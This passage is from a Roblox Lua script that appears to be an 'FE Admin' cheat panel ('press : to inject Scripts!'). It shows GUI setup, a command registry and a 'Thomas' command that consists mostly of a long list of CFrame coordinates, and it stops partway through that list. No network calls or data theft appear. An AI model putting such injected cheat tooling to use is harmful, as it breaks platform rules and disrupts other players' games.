TemplateLabel_18.Selectable = true
TemplateLabel_18.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_18.Font = Enum.Font.SourceSansLight
TemplateLabel_18.Text = "Gun - gives you a gun tool (RARE)"
TemplateLabel_18.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_18.TextScaled = true
TemplateLabel_18.TextSize = 14.000
TemplateLabel_18.TextWrapped = true

TemplateLabel_19.Name = "TemplateLabel"
TemplateLabel_19.Parent = ScrollingFrame
TemplateLabel_19.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_19.BackgroundTransparency = 1.000
TemplateLabel_19.Selectable = true
TemplateLabel_19.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_19.Font = Enum.Font.SourceSansLight
TemplateLabel_19.Text = "Bulldozer - spawns bulldozer (VERY RARE)"
TemplateLabel_19.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_19.TextScaled = true
TemplateLabel_19.TextSize = 14.000
TemplateLabel_19.TextWrapped = true

PlayerInfoB.Name = "PlayerInfoB"
PlayerInfoB.Parent = FEAdmin
PlayerInfoB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PlayerInfoB.BackgroundTransparency = 1.000
PlayerInfoB.BorderSizePixel = 0
PlayerInfoB.Position = UDim2.new(0.915814102, 0, 0.998029053, -100)
PlayerInfoB.Size = UDim2.new(0, 86, 0, 82)
PlayerInfoB.Image = "rbxassetid://1553823541"

TextButton.Parent = PlayerInfoB
TextButton.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
TextButton.BackgroundTransparency = 0.170
TextButton.BorderColor3 = Color3.fromRGB(35, 35, 35)
TextButton.BorderSizePixel = 9
TextButton.Position = UDim2.new(-4.30071592, 0, 0.0976852775, 0)
TextButton.Size = UDim2.new(0, 369, 0, 64)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Welcome to Loaf's Admin Use the Program to execute scripts Status Enabled! press : to inject Scripts!"
TextButton.TextColor3 = Color3.fromRGB(255, 231, 143)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextStrokeColor3 = Color3.fromRGB(26, 26, 26)
TextButton.TextWrapped = true

UICorner.Parent = TextButton

TextButton_2.Parent = PlayerInfoB
TextButton_2.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
TextButton_2.BackgroundTransparency = 0.250
TextButton_2.BorderColor3 = Color3.fromRGB(35, 35, 35)
TextButton_2.BorderSizePixel = 9
TextButton_2.Position = UDim2.new(-4.30071592, 0, 0.0976852775, 0)
TextButton_2.Size = UDim2.new(0, 369, 0, 64)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Welcome to Loaf's Admin Use the Program to execute scripts Status Enabled! press : to inject Scripts!"
TextButton_2.TextColor3 = Color3.fromRGB(255, 231, 143)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextStrokeColor3 = Color3.fromRGB(26, 26, 26)
TextButton_2.TextWrapped = true

-- Scripts:

-- Scripts:
local function YBMK_fake_script() -- Exit.Script 
	local script = Instance.new('Script', Exit)

	script.Parent.MouseButton1Click:Connect(function()
		ListTemplate.Visible = false
	end)
end
coroutine.wrap(YBMK_fake_script)()

local function LAHHOE_fake_script() -- Data.Dragify 
	local script = Instance.new('LocalScript', Data)

end
coroutine.wrap(LAHHOE_fake_script)()
function AddCmd(name,desc,func)

CMDS[name]=func
end
function Service(thing)
return game:GetService(thing)
end
--same cmd
AddCmd('cmds','',function()
ListTemplate.Visible = true
end)
AddCmd('Cmds','',function()
ListTemplate.Visible = true
end)
AddCmd('Thomas','',function()
local Handles = {
CFrame.new(1.9499995708465576, -0.4999998211860657, 1.0500001907348633),
CFrame.new(1.2999999523162842, 0.900000274181366, -6.5),
CFrame.new(2.299999952316284, -1.5999996662139893, -5.5),
CFrame.new(0.30000001192092896, 0.900000274181366, -6.5),
CFrame.new(0.800000011920929, -2.5999996662139893, -3),
CFrame.new(1.2999999523162842, -0.599999725818634, -2.5),
CFrame.new(1.7999999523162842, -0.599999725818634, -5.5),
CFrame.new(2.299999952316284, -0.599999725818634, 0),
CFrame.new(2.799999713897705, 1.9000003337860107, -2),
CFrame.new(0.800000011920929, 2.4000003337860107, -4.5),
CFrame.new(1.2999999523162842, -0.09999972581863403, -5.5),
CFrame.new(1.2999999523162842, 0.900000274181366, -4),
CFrame.new(2.3000001907348633, -3.0999996662139893, -6),
CFrame.new(2.299999713897705, 1.9000003337860107, -5),
CFrame.new(3.299999952316284, -0.09999972581863403, -4),
CFrame.new(0.30000001192092896, 1.9000003337860107, -5),
CFrame.new(2.299999713897705, 2.4000003337860107, 0.5),
CFrame.new(3.299999713897705, 1.900000810623169, 0),
CFrame.new(2.799999713897705, 1.9000003337860107, -1),
CFrame.new(1.3000001907348633, -3.0999996662139893, -4.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, -6),
CFrame.new(0.7499998211860657, -0.6999996304512024, 1.0500001907348633),
CFrame.new(3.799999952316284, 2.000000238418579, 0.19999980926513672),
CFrame.new(1.2999999523162842, -0.599999725818634, -3.5),
CFrame.new(3.299999713897705, 1.900000810623169, -3.5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -2.5),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -0.5),
CFrame.new(0.800000011920929, -2.5999996662139893, -1.5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -6.5),
CFrame.new(1.3000001907348633, -3.8999998569488525, 0.5),
CFrame.new(1.2999999523162842, 0.900000274181366, -3.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, 0.5),
CFrame.new(0.800000011920929, 1.9000003337860107, -2.5),
CFrame.new(2.799999713897705, 1.9000003337860107, -0.5),
CFrame.new(1.799999713897705, 0.900000274181366, -2),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -6.5),
CFrame.new(2.299999952316284, -0.09999972581863403, -5),
CFrame.new(1.3000001907348633, -2.5999996662139893, -7),
CFrame.new(0.800000011920929, 1.9000003337860107, -5),
CFrame.new(1.2999999523162842, -0.09999972581863403, -7),
CFrame.new(2.299999952316284, -0.09999972581863403, -6.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, -4),
CFrame.new(3.299999952316284, -1.0999994277954102, -2),
CFrame.new(1.8000001907348633, -3.0999996662139893, -5.5),
CFrame.new(-0.20000000298023224, 2.3999998569488525, -7),
CFrame.new(-0.699999988079071, 1.8999998569488525, -4.5),
CFrame.new(2.299999713897705, 0.900000274181366, -1.5),
CFrame.new(0.800000011920929, 0.900000274181366, -4),
CFrame.new(0.30000001192092896, -2.5999996662139893, -5),
CFrame.new(1.3000001907348633, -3.0999996662139893, -0.5),
CFrame.new(3.299999952316284, -1.0999994277954102, -2.5),
CFrame.new(2.299999952316284, -2.0999996662139893, -1.5),
CFrame.new(0.800000011920929, -2.5999996662139893, -3.5),
CFrame.new(1.8000001907348633, -3.0999996662139893, -5),
CFrame.new(2.799999952316284, -0.09999972581863403, -1.5),
CFrame.new(3.299999713897705, 1.900000810623169, -0.5),
CFrame.new(1.2999999523162842, -0.599999725818634, -1.5),
CFrame.new(0.30000001192092896, -1.5999996662139893, 0.5),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -3.5),
CFrame.new(3.799999952316284, 2.6000006198883057, 1),
CFrame.new(1.7999999523162842, -1.5999996662139893, -6.5),
CFrame.new(2.799999713897705, 1.9000003337860107, -5.5),
CFrame.new(2.299999952316284, -2.0999996662139893, -2.5),
CFrame.new(2.799999952316284, -0.09999972581863403, -1),
CFrame.new(3.299999952316284, -1.0999994277954102, -6),
CFrame.new(3.799999952316284, 2.200000524520874, 1),
CFrame.new(1.799999713897705, 0.900000274181366, -4),
CFrame.new(3.299999952316284, -1.5999994277954102, -7),
CFrame.new(1.7999999523162842, -0.09999972581863403, -2.5),
CFrame.new(-0.699999988079071, 2.200000047683716, 1),
CFrame.new(0.30000001192092896, -0.09999972581863403, -0.5),
CFrame.new(3.799999952316284, 2.000000238418579, -7.300000190734863),
CFrame.new(-0.20000000298023224, -0.599999725818634, -5),
CFrame.new(0.800000011920929, -1.5999996662139893, -6),
CFrame.new(1.799999713897705, 1.9000003337860107, -2.5),
CFrame.new(0.800000011920929, -0.09999972581863403, -2),
CFrame.new(3.799999952316284, 2.4000003337860107, -3.6999998092651367),
CFrame.new(2.799999952316284, -0.09999972581863403, 0),
CFrame.new(3.299999952316284, -0.599999725818634, -2),
CFrame.new(2.799999952316284, -0.599999725818634, -0.5),
CFrame.new(3.299999952316284, -0.599999725818634, -4.5),
CFrame.new(1.9500000476837158, -0.8999999165534973, 1.0500001907348633),
CFrame.new(0.30000001192092896, 0.900000274181366, -4),
CFrame.new(2.799999952316284, -0.09999972581863403, -6),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -2),
CFrame.new(0.800000011920929, -0.599999725818634, -6),
CFrame.new(2.799999952316284, 0.900000274181366, -0.5),
CFrame.new(-0.699999988079071, 2.3999998569488525, 1.3000001907348633),
CFrame.new(1.7999999523162842, -0.599999725818634, -4),
CFrame.new(2.299999952316284, -0.599999725818634, -2.5),
CFrame.new(1.7999999523162842, -2.5999996662139893, -7),
CFrame.new(2.799999952316284, -0.09999972581863403, -6.5),
CFrame.new(3.299999952316284, -0.09999972581863403, -3),
CFrame.new(1.3000001907348633, -3.0999996662139893, 0),
CFrame.new(2.299999713897705, 1.9000003337860107, -1),
CFrame.new(1.7999999523162842, -2.5999996662139893, -2),
CFrame.new(-0.20000000298023224, 2.3999998569488525, 0.5),
CFrame.new(-0.20000000298023224, -3.1000001430511475, -5.5),
CFrame.new(3.799999952316284, 2.200000524520874, -1.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, -3.5),
CFrame.new(-0.699999988079071, 2.3999998569488525, -6.199999809265137),
CFrame.new(2.299999952316284, -1.5999996662139893, -7),
CFrame.new(0.800000011920929, 1.9000003337860107, -4),
CFrame.new(2.799999952316284, -1.5999996662139893, -3),
CFrame.new(1.2999999523162842, -1.5999996662139893, -5.5),
CFrame.new(2.299999952316284, -0.599999725818634, -7),
CFrame.new(1.2999999523162842, -0.599999725818634, -6),
CFrame.new(1.799999713897705, 1.9000003337860107, -2),
CFrame.new(1.8500001430511475, -1.0999996662139893, 1.0500001907348633),
CFrame.new(2.3000001907348633, -3.0999996662139893, -7),
CFrame.new(0.30000001192092896, -2.0999996662139893, 0.5),
CFrame.new(2.799999713897705, 2.4000003337860107, -4.5),
CFrame.new(2.799999952316284, -1.5999996662139893, -6),
CFrame.new(2.799999952316284, 0.900000274181366, -6),
CFrame.new(1.2999999523162842, 1.9000003337860107, -4),
CFrame.new(0.30000001192092896, -0.09999972581863403, -5),
CFrame.new(2.799999952316284, -0.599999725818634, -4),
CFrame.new(1.2999999523162842, -0.599999725818634, -7),
CFrame.new(3.299999713897705, 1.900000810623169, -2),
CFrame.new(2.299999952316284, -2.0999996662139893, -4.5),
CFrame.new(2.299999952316284, -0.599999725818634, -4),
CFrame.new(2.799999713897705, 1.9000003337860107, 1.1999998092651367),
CFrame.new(3.299999713897705, 1.900000810623169, -2.5),
CFrame.new(3.799999952316284, 2.000000238418579, -1.6000003814697266),
CFrame.new(2.299999952316284, -2.0999996662139893, -4),
CFrame.new(2.799999713897705, 1.9000003337860107, -3),
CFrame.new(1.7999999523162842, -0.599999725818634, -1.5),
CFrame.new(2.299999952316284, -1.5999996662139893, -5),
CFrame.new(2.299999952316284, -1.5999996662139893, 0.5),
CFrame.new(-0.699999988079071, 2.799999952316284, -2.3000001907348633),
CFrame.new(0.30000001192092896, -0.599999725818634, -1),
CFrame.new(2.799999952316284, 0.900000274181366, -7),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -1),
CFrame.new(1.7999999523162842, -0.599999725818634, -1),
CFrame.new(0.800000011920929, -3.0999996662139893, -7),
CFrame.new(1.0499999523162842, -0.4999998211860657, 1.0500001907348633),
CFrame.new(1.7999999523162842, -0.599999725818634, -5),
CFrame.new(-0.699999988079071, 2.200000047683716, -2.40000057220459),
CFrame.new(2.799999952316284, -1.5999996662139893, -5),
CFrame.new(3.299999952316284, -0.599999725818634, -1),
CFrame.new(2.8000001907348633, -3.0999996662139893, -5.5),
CFrame.new(2.299999713897705, 0.900000274181366, -5.5),
CFrame.new(1.7999999523162842, -2.5999996662139893, 0),
CFrame.new(2.799999952316284, -0.09999972581863403, -3),
CFrame.new(2.3000001907348633, -3.0999996662139893, -5),
CFrame.new(1.7999999523162842, -0.599999725818634, -4.5),
CFrame.new(3.799999952316284, 2.6000006198883057, -4.899999618530273),
CFrame.new(0.7499998211860657, -0.7000001072883606, 1.0500001907348633),
CFrame.new(2.299999713897705, 0.900000274181366, -0.5),
CFrame.new(2.299999952316284, -0.599999725818634, -6.5),
CFrame.new(3.299999713897705, 2.400000810623169, 0.5),
CFrame.new(-0.20000000298023224, -0.599999725818634, -5.5),
CFrame.new(0.30000001192092896, 0.900000274181366, -3),
CFrame.new(-0.699999988079071, 2.3999998569488525, -2.700000286102295),
CFrame.new(3.299999952316284, -0.09999972581863403, -7),
CFrame.new(0.800000011920929, -0.599999725818634, -3),
CFrame.new(2.299999713897705, 1.9000003337860107, -3),
CFrame.new(0.30000001192092896, -2.0999996662139893, -4),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -7),
CFrame.new(1.7999999523162842, -0.09999972581863403, -5),
CFrame.new(2.799999713897705, 1.9000003337860107, 0.5),
CFrame.new(-0.20000000298023224, -0.599999725818634, -1.5),
CFrame.new(0.30000001192092896, -0.599999725818634, -6.5),
CFrame.new(0.800000011920929, -3.0999996662139893, -5),
CFrame.new(3.799999952316284, 2.8000004291534424, -6.600000381469727),
CFrame.new(1.3000001907348633, -3.0999996662139893, -7),
CFrame.new(0.30000001192092896, -1.5999996662139893, -7),
CFrame.new(2.799999952316284, 0.900000274181366, -4),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -6.5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -1.5),
CFrame.new(1.3000001907348633, -2.5999996662139893, -5),
CFrame.new(-0.699999988079071, 2.000000238418579, 0.19999980926513672),
CFrame.new(3.299999952316284, -0.09999972581863403, -6),
CFrame.new(-0.699999988079071, 2.3999998569488525, -5.200000762939453),
CFrame.new(0.30000001192092896, 0.900000274181366, -6),
CFrame.new(3.299999952316284, -0.599999725818634, -5.5),
CFrame.new(0.800000011920929, -0.09999972581863403, -6.5),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -6),
CFrame.new(1.2999999523162842, 0.900000274181366, -1.5),
CFrame.new(0.30000001192092896, 1.9000003337860107, -2),
CFrame.new(1.799999713897705, 2.4000003337860107, -4.5),
CFrame.new(1.7999999523162842, -2.5999996662139893, 0.5),
CFrame.new(2.799999952316284, 0.900000274181366, -1),
CFrame.new(1.2999999523162842, -0.09999972581863403, -3),
CFrame.new(3.299999713897705, 2.400000810623169, -4.5),
CFrame.new(2.799999952316284, -0.09999972581863403, -4),
CFrame.new(-0.699999988079071, 2.200000047683716, 0.09999942779541016),
CFrame.new(-0.20000000298023224, -0.599999725818634, -3.5),
CFrame.new(0.30000001192092896, 0.900000274181366, -7),
CFrame.new(0.30000001192092896, 1.9000003337860107, -3),
CFrame.new(1.799999713897705, 0.900000274181366, -0.5),
CFrame.new(2.799999713897705, 2.4000003337860107, -7),
CFrame.new(-0.699999988079071, 2.799999952316284, -6.600000381469727),
CFrame.new(2.799999952316284, 0.900000274181366, -1.5),
CFrame.new(3.299999952316284, -0.09999972581863403, -6.5),
CFrame.new(3.799999952316284, 2.000000238418579, -2.3000001907348633),
CFrame.new(3.799999952316284, 2.8000004291534424, -4.100000381469727),
CFrame.new(1.3000001907348633, -3.0999996662139893, -6.5),
CFrame.new(1.2999999523162842, 0.900000274181366, -5.5),
CFrame.new(3.799999952316284, 1.900000810623169, -7),
CFrame.new(2.299999713897705, 1.9000003337860107, -6),
CFrame.new(-0.699999988079071, 2.5999996662139893, -4.899999618530273),
CFrame.new(1.799999713897705, 0.900000274181366, -6.5),
CFrame.new(3.299999952316284, 0.900000274181366, -1),
CFrame.new(3.299999713897705, 1.900000810623169, -5),
CFrame.new(0.30000001192092896, 0.900000274181366, -0.5),
CFrame.new(0.800000011920929, -2.5999996662139893, -1),
CFrame.new(2.299999713897705, 1.9000003337860107, -5.5),
CFrame.new(0.800000011920929, 0.900000274181366, 0),
CFrame.new(2.799999713897705, 1.9000003337860107, -1.5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -1),
CFrame.new(1.2999999523162842, 1.9000003337860107, -5),
CFrame.new(-0.20000000298023224, -0.599999725818634, -4.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, -2),
CFrame.new(1.3000001907348633, -3.0999996662139893, -3.5),
CFrame.new(0.800000011920929, -2.5999996662139893, -2),
CFrame.new(2.299999713897705, 1.9000003337860107, -3.5),
CFrame.new(0.30000001192092896, -0.599999725818634, -3),
CFrame.new(0.800000011920929, -0.09999972581863403, -0.5),
CFrame.new(2.299999713897705, 0.900000274181366, 0),
CFrame.new(3.799999952316284, 2.4000003337860107, -7.700000762939453),
CFrame.new(2.299999952316284, -0.599999725818634, -3),
CFrame.new(0.30000001192092896, -2.0999996662139893, -2.5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -6),
CFrame.new(0.30000001192092896, 0.900000274181366, -2),
CFrame.new(2.299999713897705, 0.900000274181366, -2.5),
CFrame.new(3.799999952316284, 2.4000003337860107, 1.3000001907348633),
CFrame.new(2.799999952316284, -0.599999725818634, -5.5),
CFrame.new(2.299999713897705, 0.900000274181366, -4),
CFrame.new(0.800000011920929, -0.599999725818634, -3.5),
CFrame.new(3.299999713897705, 2.400000810623169, -7),
CFrame.new(0.30000001192092896, -0.09999972581863403, -1.5),
CFrame.new(-0.699999988079071, 2.000000238418579, -2.3000001907348633),
CFrame.new(3.299999952316284, -0.09999972581863403, -5),
CFrame.new(-0.699999988079071, 2.8999998569488525, -6.899999618530273),
CFrame.new(0.30000001192092896, 1.9000003337860107, -1),
CFrame.new(3.799999952316284, 2.4000003337860107, -5.200000762939453),
CFrame.new(0.800000011920929, -3.0999996662139893, -5.5),
CFrame.new(3.799999952316284, 2.200000524520874, -6.5),
CFrame.new(-0.699999988079071, 1.8999998569488525, -2),
CFrame.new(3.299999713897705, 1.900000810623169, -6.5),
CFrame.new(3.799999952316284, 2.4000003337860107, -3.6999998092651367),
CFrame.new(3.799999952316284, 2.200000524520874, -4.90000057220459),
CFrame.new(1.2999999523162842, -0.599999725818634, -6.5),
CFrame.new(2.249999761581421, -0.7000001072883606, 1.0500001907348633),
CFrame.new(-0.699999988079071, 1.8999998569488525, 0.5),
CFrame.new(3.299999952316284, -0.09999972581863403, -5.5),
CFrame.new(0.800000011920929, 0.900000274181366, -5),
CFrame.new(2.799999952316284, 0.900000274181366, -2.5),
CFrame.new(2.299999952316284, -2.0999996662139893, -1),
CFrame.new(1.0000003576278687, -4.599999904632568, 0.5),
CFrame.new(1.2999999523162842, -0.09999972581863403, -5),
CFrame.new(1.2999999523162842, -1.5999996662139893, -7),
CFrame.new(0.800000011920929, -0.09999972581863403, -3),
CFrame.new(0.800000011920929, -0.599999725818634, -5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -3.5),
CFrame.new(-0.20000000298023224, 1.8999998569488525, 0.5),
CFrame.new(2.799999952316284, -0.599999725818634, -1),
CFrame.new(-0.699999988079071, 2.200000047683716, -6.5),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -6),
CFrame.new(3.799999952316284, 2.4000003337860107, -7.700000762939453),
CFrame.new(2.799999713897705, 1.9000003337860107, -3.5),
CFrame.new(0.30000001192092896, -1.5999996662139893, -6),
CFrame.new(1.799999713897705, 0.900000274181366, -1),
CFrame.new(1.2999999523162842, -0.09999972581863403, -3.5),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -3.5),
CFrame.new(0.30000001192092896, -0.599999725818634, -0.5),
CFrame.new(0.30000001192092896, -0.599999725818634, -6),
CFrame.new(1.2999999523162842, -0.09999972581863403, -6),
CFrame.new(2.799999952316284, -0.09999972581863403, 0.5),
CFrame.new(2.799999952316284, -0.599999725818634, -2.5),
CFrame.new(0.800000011920929, 1.9000003337860107, -3),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -5),
CFrame.new(0.30000001192092896, -0.09999972581863403, -4.5),
CFrame.new(3.299999952316284, 0.900000274181366, 0.5),
CFrame.new(3.299999952316284, -1.0999994277954102, -4),
CFrame.new(0.800000011920929, 0.900000274181366, -2),
CFrame.new(3.799999952316284, 2.4000003337860107, -6.199999809265137),
CFrame.new(3.299999713897705, 1.900000810623169, -7),
CFrame.new(0.30000001192092896, -2.0999996662139893, -1),
CFrame.new(2.799999952316284, -2.5999996662139893, -5),
CFrame.new(3.299999952316284, -0.09999972581863403, -1),
CFrame.new(3.299999952316284, 0.900000274181366, -4.5),
CFrame.new(2.799999952316284, -0.599999725818634, -6.5),
CFrame.new(0.800000011920929, 1.9000003337860107, -4.5),
CFrame.new(3.299999952316284, -1.0999994277954102, 0.5),
CFrame.new(0.800000011920929, -0.09999972581863403, -5.5),
CFrame.new(0.30000001192092896, 1.9000003337860107, -0.5),
CFrame.new(1.7999999523162842, -1.5999996662139893, 0.5),
CFrame.new(1.2999999523162842, 0.900000274181366, -5),
CFrame.new(2.249999761581421, -0.7000001072883606, 1.0500001907348633),
CFrame.new(-0.20000000298023224, -0.599999725818634, -6),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -4.5),
CFrame.new(1.7999999523162842, -0.599999725818634, -7),
CFrame.new(0.30000001192092896, -2.0999996662139893, -4.5),
CFrame.new(2.799999952316284, 0.900000274181366, -4.5),
CFrame.new(-0.699999988079071, 2.5999996662139893, -2.4000000953674316),
CFrame.new(3.799999952316284, 2.6000006198883057, -2.4000000953674316),
CFrame.new(1.2999999523162842, 0.900000274181366, -1),
CFrame.new(0.800000011920929, -0.599999725818634, 0),
CFrame.new(1.799999713897705, 1.9000003337860107, -3.5),
CFrame.new(2.799999713897705, 1.9000003337860107, -4.5),
CFrame.new(2.799999713897705, 1.9000003337860107, -2.5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, 0),
CFrame.new(-0.20000000298023224, 0.900000274181366, -0.5),
CFrame.new(3.299999952316284, -1.0999994277954102, -3.5),
CFrame.new(1.2999999523162842, -0.599999725818634, 0),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -3),
CFrame.new(-0.20000000298023224, -2.5999996662139893, -7),
CFrame.new(3.299999713897705, 1.900000810623169, -5.5),
CFrame.new(3.299999952316284, -1.5999994277954102, -6.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, -3.5),
CFrame.new(3.299999952316284, -3.099999189376831, -5.5),
CFrame.new(1.799999713897705, 1.9000003337860107, -6.5),
CFrame.new(-0.699999988079071, 2.8999998569488525, 0.5999999046325684),
CFrame.new(1.7999999523162842, -2.5999996662139893, -4.5),
CFrame.new(2.799999952316284, 0.900000274181366, -5),
CFrame.new(1.7999999523162842, -2.5999996662139893, -0.5),
CFrame.new(3.299999952316284, 0.900000274181366, -3),
CFrame.new(2.8000001907348633, -3.0999996662139893, -7),
CFrame.new(3.799999952316284, 2.4000003337860107, -1.1999998092651367),
CFrame.new(1.8000001907348633, -3.0999996662139893, -7),
CFrame.new(2.799999952316284, -1.5999996662139893, -0.5),
CFrame.new(0.30000001192092896, 0.900000274181366, -4.5),
CFrame.new(0.30000001192092896, -3.0999996662139893, -7),
CFrame.new(2.299999952316284, -0.09999972581863403, -2),
CFrame.new(-0.699999988079071, 2.200000047683716, -7.40000057220459),
CFrame.new(0.30000001192092896, 0.900000274181366, -1),
CFrame.new(0.800000011920929, 0.900000274181366, -1.5),
CFrame.new(0.800000011920929, -2.5999996662139893, 0.5),
CFrame.new(2.299999713897705, 1.9000003337860107, -2),
CFrame.new(3.299999952316284, -0.09999972581863403, 0),
CFrame.new(3.299999713897705, 1.900000810623169, -1),
CFrame.new(1.799999713897705, 1.9000003337860107, -1.5),
CFrame.new(-0.20000000298023224, -1.0999999046325684, -6),
CFrame.new(3.299999952316284, -3.099999189376831, -6.5),
CFrame.new(0.800000011920929, -1.5999996662139893, -7),
CFrame.new(1.2999999523162842, -0.599999725818634, -1),
CFrame.new(0.800000011920929, 0.900000274181366, -7),
CFrame.new(2.8000001907348633, -3.0999996662139893, -6),
CFrame.new(2.299999713897705, 2.4000003337860107, -7),
CFrame.new(-0.699999988079071, 1.8999998569488525, -7),
CFrame.new(1.7999999523162842, -2.5999996662139893, -3),
CFrame.new(3.799999952316284, 1.900000810623169, -4.5),
CFrame.new(3.799999952316284, 2.200000524520874, -2.40000057220459),
CFrame.new(-0.20000000298023224, -3.1000001430511475, -6),
CFrame.new(0.30000001192092896, 0.900000274181366, -1.5),
CFrame.new(2.799999952316284, -1.5999996662139893, -4.5),
CFrame.new(1.5499999523162842, -1.1999995708465576, 1.0500001907348633),
CFrame.new(1.799999713897705, 1.9000003337860107, -4.5),
CFrame.new(1.8000001907348633, -3.0999996662139893, -6),
CFrame.new(2.799999952316284, 0.900000274181366, -2),
CFrame.new(3.299999952316284, 0.900000274181366, -7),
CFrame.new(-0.699999988079071, 2.3999998569488525, -1.1999998092651367),
CFrame.new(3.799999952316284, 2.6000006198883057, -7.399999618530273),
CFrame.new(2.299999952316284, -0.09999972581863403, -1),
CFrame.new(2.799999952316284, -0.599999725818634, -3),
CFrame.new(1.2999999523162842, 0.900000274181366, -2),
CFrame.new(3.799999952316284, 2.9000003337860107, -1.9000000953674316),
CFrame.new(0.800000011920929, 0.900000274181366, -4.5),
CFrame.new(0.800000011920929, -1.5999996662139893, -7),
CFrame.new(1.3000001907348633, -3.0999996662139893, -2),
CFrame.new(2.799999952316284, -1.5999996662139893, -3.5),
CFrame.new(3.799999952316284, 2.9000003337860107, -4.399999618530273),
CFrame.new(3.299999952316284, 0.900000274181366, -0.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, -4.5),
CFrame.new(-0.699999988079071, 2.000000238418579, -4.100000381469727),
CFrame.new(2.799999952316284, -0.599999725818634, -2),
CFrame.new(0.30000001192092896, -1.5999996662139893, -7),
CFrame.new(1.2999999523162842, -1.5999996662139893, -5),
CFrame.new(0.30000001192092896, -2.0999996662139893, -0.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, 0),
CFrame.new(3.799999952316284, 2.9000003337860107, -6.899999618530273),
CFrame.new(1.4499995708465576, -0.2000001072883606, 1.0500001907348633),
CFrame.new(0.800000011920929, -0.599999725818634, -4),
CFrame.new(-0.20000000298023224, 2.3999998569488525, -4.5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -4.5),
CFrame.new(2.299999713897705, 0.900000274181366, -2),
CFrame.new(1.2999999523162842, 1.9000003337860107, -3),
CFrame.new(2.799999713897705, 2.4000003337860107, -2),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -2),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -3),
CFrame.new(0.800000011920929, 2.4000003337860107, -7),
CFrame.new(1.799999713897705, 0.900000274181366, -2.5),
CFrame.new(2.799999713897705, 1.9000003337860107, -4),
CFrame.new(0.800000011920929, -1.5999996662139893, 0.5),
CFrame.new(0.30000001192092896, 1.9000003337860107, -5.5),
CFrame.new(-0.699999988079071, 2.000000238418579, -7.300000190734863),
CFrame.new(2.799999952316284, -1.5999996662139893, -6.5),
CFrame.new(2.299999713897705, 0.900000274181366, -3.5),
CFrame.new(1.2999999523162842, -1.5999996662139893, -6.5),
CFrame.new(0.30000001192092896, -0.09999972581863403, -6.5),
CFrame.new(2.799999952316284, -1.5999996662139893, 0),
CFrame.new(2.799999952316284, -0.599999725818634, 0),
CFrame.new(0.800000011920929, -2.5999996662139893, -7),
CFrame.new(2.799999952316284, -0.09999972581863403, -2),
CFrame.new(2.799999952316284, -1.5999996662139893, -7),
CFrame.new(0.30000001192092896, -0.599999725818634, -5.5),
CFrame.new(2.299999952316284, -2.0999996662139893, 0),
CFrame.new(2.799999952316284, 0.900000274181366, -6.5),
CFrame.new(0.800000011920929, 2.4000003337860107, 0.5),
CFrame.new(1.7999999523162842, -0.599999725818634, 0.5),
CFrame.new(2.799999952316284, -0.09999972581863403, -5.5),
CFrame.new(0.800000011920929, -1.5999996662139893, -5.5),
CFrame.new(2.799999952316284, 0.900000274181366, 0),
CFrame.new(3.799999952316284, 2.8000004291534424, 0.19999980926513672),
CFrame.new(-0.20000000298023224, -0.599999725818634, -7),
CFrame.new(0.800000011920929, 1.9000003337860107, -5.5),
CFrame.new(0.30000001192092896, 2.4000003337860107, 0.5),
CFrame.new(1.0499999523162842, -0.8999999165534973, 1.0500001907348633),
CFrame.new(1.799999713897705, 1.9000003337860107, 0.5),
CFrame.new(0.3999994397163391, 1.9000003337860107, 0.7999997138977051),
CFrame.new(0.30000001192092896, -1.5999996662139893, -5),
CFrame.new(3.299999952316284, 0.900000274181366, -5),
CFrame.new(-0.20000000298023224, -1.0999999046325684, -6),
CFrame.new(-0.699999988079071, 2.3999998569488525, -6.199999809265137),
CFrame.new(0.30000001192092896, -0.09999972581863403, -2.5),
CFrame.new(2.799999952316284, -1.5999996662139893, 0.5),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -4.5),
CFrame.new(1.2999999523162842, -0.09999972581863403, -1.5),
CFrame.new(3.299999952316284, 0.900000274181366, 0),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -7),
CFrame.new(0.800000011920929, -0.09999972581863403, 0),
CFrame.new(0.800000011920929, 1.9000003337860107, 0.5),
CFrame.new(2.299999952316284, -0.09999972581863403, -3),
CFrame.new(1.2999999523162842, 0.900000274181366, -7),
